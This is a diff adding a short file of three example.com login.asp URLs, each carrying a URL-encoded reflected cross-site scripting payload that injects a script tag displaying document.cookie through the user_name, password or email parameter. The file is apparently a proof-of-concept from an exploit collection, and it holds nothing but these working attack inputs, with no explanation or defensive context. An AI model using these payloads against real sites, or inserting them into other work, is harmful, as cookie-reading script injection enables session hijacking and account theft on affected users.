@@ -1,0 +1,5 @@
+http://www.example.com/login.asp?user_name=%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&password=&ret_page=
+
+http://www.example.com/login.asp?user_name=&password=%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&ret_page=
+
+http://www.example.com/login.asp?email=sd%40sd.df%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&search_btn=SEND&action=lookup&do_search=1
